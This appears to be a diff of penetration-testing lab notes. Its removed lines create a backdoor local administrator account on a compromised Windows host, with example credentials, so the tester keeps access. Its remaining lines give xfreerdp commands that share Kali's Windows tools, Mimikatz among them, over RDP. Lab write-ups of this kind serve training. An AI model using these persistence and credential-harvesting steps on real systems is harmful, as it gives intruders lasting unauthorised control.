@@ -1,21 +1,3 @@
-Now that we have a root shell on the windows box .150 
-
-First we create the account itself:  
-`net user USERNAME PASSWORD /add`  
-
-user: keez pw: asdf123
-
-Next we add our newly created account in the "Administrators" and "Remote Management Users" groups:  
-`net localgroup Administrators USERNAME /add  
-net localgroup "Remote Management Users" USERNAME /add`
-
-We can now rdp to this box for stable access. 
-
-
----
-
-I chose to use xfreerdp
-
 `xfreerdp /v:IP /u:USERNAME /p:PASSWORD`
 
 Userful xfreerdp flags:
@@ -28,17 +10,3 @@ Userful xfreerdp flags:
 A useful directory to share is the `/usr/share/windows-resources` directory on Kali. This shares most of the Windows tools stockpiled on Kali, including Mimikatz which we will be using next. This would make the full command:  
 
 `xfreerdp /v:IP /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share`
-
-___
-
-
-
-from [[enumeration 03]] we know the following ports are open:
-
-```bash
-3389/tcp open  ms-wbt-server
-5985/tcp open  wsman
-```
-
-
-
